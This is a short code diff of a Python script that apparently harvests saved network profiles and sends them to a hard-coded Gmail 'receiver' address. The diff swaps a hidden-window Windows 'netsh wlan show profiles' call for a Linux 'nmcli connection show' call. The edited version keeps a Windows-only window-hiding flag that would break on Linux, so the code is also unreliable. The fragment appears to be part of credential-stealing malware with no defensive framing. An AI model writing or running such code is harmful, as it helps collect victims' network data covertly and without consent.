@@ -16,22 +16,23 @@ receiver= "sonu.code.ai@gmail.com"
 
 
 # Run a simple command
-if platform.system() == "Windows":
-    try:
-        # Run the CMD command
-        output = subprocess.run(
-            ["cmd", "/c", "netsh wlan show profiles"],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True,
-            creationflags=subprocess.CREATE_NO_WINDOW  # Optional: hide CMD window
-        )
 
-        # Get the output
-        final_output = output.stdout if output.returncode == 0 else output.stderr
+try:
+    # Run the CMD command
+    output = subprocess.run(
+        ["nmcli", "connection", "show"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True,
+        creationflags=subprocess.CREATE_NO_WINDOW  # Optional: hide CMD window
+    )
 
-    except Exception as e:
-        final_output = f"Error occurred: {e}"
+    
+    # Get the output
+    final_output = output.stdout if output.returncode == 0 else output.stderr
+
+except Exception as e:
+    final_output = f"Error occurred: {e}"
 
 
 
